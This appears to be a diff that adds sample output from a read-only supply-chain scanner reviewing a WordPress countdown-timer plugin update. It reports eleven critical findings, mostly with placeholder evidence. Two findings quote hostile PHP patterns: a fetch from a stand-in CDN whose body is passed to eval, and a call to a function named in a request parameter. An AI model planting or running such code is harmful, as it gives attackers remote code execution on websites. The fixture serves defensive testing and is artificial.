@@ -1,0 +1,55 @@
+rhythm sightread <version> - wp-plugin countdown-timer-ultimate - 2.6.7 to 2.6.8
+Read-only. Sightread changes nothing on your site and never runs the code it downloads.
+note: --skip-roadie-verify was used
+
+Installed: 2.6.7 in wp-content/plugins/countdown-timer-ultimate, matches wordpress.org
+Candidate: 2.6.8, released 2026-10-24, latest
+Integrity: both versions: every file matches wordpress.org checksums (SHA-256)
+Publisher: unchanged (sampleauthor)
+Diff: 14 files changed, 1 added, +2,184 -12 lines, 412 KB to 431 KB
+Changelog: 2.6.8: "Check compatibility with WordPress 6.8"
+
+[CRITICAL] Archive does not match the published hash - includes/integrity-mismatch.php:10
+  evidence: integrity-mismatch evidence
+  advice: Review integrity-mismatch before you update.
+[CRITICAL] Same version, different bytes than the lockfile recorded - includes/version-republished.php:10
+  evidence: version-republished evidence
+  advice: Review version-republished before you update.
+[CRITICAL] Allowed version now has a different hash - includes/approved-version-changed.php:10
+  evidence: approved-version-changed evidence
+  advice: Review approved-version-changed before you update.
+[CRITICAL] Listed as malicious by OSV - includes/known-malicious.php:10
+  evidence: known-malicious evidence
+  advice: Review known-malicious before you update.
+[CRITICAL] Closed on WordPress.org - includes/wporg-closed.php:10
+  evidence: wporg-closed evidence
+  advice: Review wporg-closed before you update.
+[CRITICAL] Archive entry points outside the package - includes/archive-path-escape.php:10
+  evidence: archive-path-escape evidence
+  advice: Review archive-path-escape before you update.
+[CRITICAL] Fetches remote code and runs it - includes/class-wpos-analytics.php:88
+  evidence: wp_remote_get('https://analytics.wpos-cdn.example/v2/p') → eval($body)
+  advice: Review remote-fetch-exec before you update.
+[CRITICAL] Decodes hidden code and runs it - includes/decode-exec.php:10
+  evidence: decode-exec evidence
+  advice: Review decode-exec before you update.
+[CRITICAL] Hides users from the admin user list - includes/admin-user-hidden.php:10
+  evidence: admin-user-hidden evidence
+  advice: Review admin-user-hidden before you update.
+[CRITICAL] Private name also published publicly - includes/dependency-confusion.php:10
+  evidence: dependency-confusion evidence
+  advice: Review dependency-confusion before you update.
+[CRITICAL] Runs code built at run time - includes/loader.php:20
+  evidence: $f = $_GET['cb']; $f();
+  raised by: owner-change
+  advice: Review eval-dynamic before you update.
+
+Verdict: HOLD
+11 critical
+Sightread reports what changed. It does not judge intent.
+1 update reviewed, 2 archives verified, 0 from cache, <dur>
+
+next: the full diff: rhythm sightread plugin countdown-timer-ultimate -o review.html --open
+next: explain a finding: rhythm sightread explain integrity-mismatch
+next: record a review: rhythm sightread allow wp-plugin:countdown-timer-ultimate@2.6.8 --reason "..."
+
